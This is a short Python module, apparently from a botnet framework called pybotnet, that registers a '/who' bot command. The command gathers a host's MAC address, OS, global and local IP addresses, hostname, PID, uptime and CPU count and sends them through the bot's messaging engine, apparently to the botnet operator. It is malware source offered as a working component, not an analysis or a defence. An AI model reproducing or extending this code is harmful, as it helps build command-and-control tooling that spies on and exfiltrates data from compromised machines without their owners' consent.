from .. import BotNet, Request


@BotNet.default_script(script_version="0.0.1")
def who(request: Request) -> str:
    """return system info
    example command: `/who` \n
    return:
    * scripts_name
    * mac_addres
    * os
    * global_ip
    * up_time
    * host_name
    * local_ip
    * current_route
    * pid
    * cpu_count
    * pybotnet_version
    
    (cache for 30 seconds)
    """

    info = ""

    for k, v in request.system_info().items():
        if k == "scripts_name":
            info += "scripts_name:\n"
            for scripts_name in v:
                info += f"    {scripts_name}\n"
        else:
            info += f"\n{k}: {v}"

    request.engine.send(info)
